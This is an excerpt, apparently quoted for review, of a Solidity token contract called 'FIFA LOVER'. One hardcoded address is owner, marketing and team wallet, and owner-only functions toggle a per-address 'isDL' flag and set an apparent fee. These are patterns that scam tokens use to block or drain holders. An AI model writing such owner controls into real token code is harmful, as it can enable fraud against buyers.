...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x831B0f766d94a1100a1268bc2B28221C151951A2;
        // owner address
...
contract flver is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "FIFA LOVER";
    string private _symbol = "flver";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x831B0f766d94a1100a1268bc2B28221C151951A2); // Marketing Address
    address payable public teamWalletAddress = payable(0x831B0f766d94a1100a1268bc2B28221C151951A2); // Team Address
    ...
    function setDLflver(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEflver(uint256 fe) external onlyOwner {
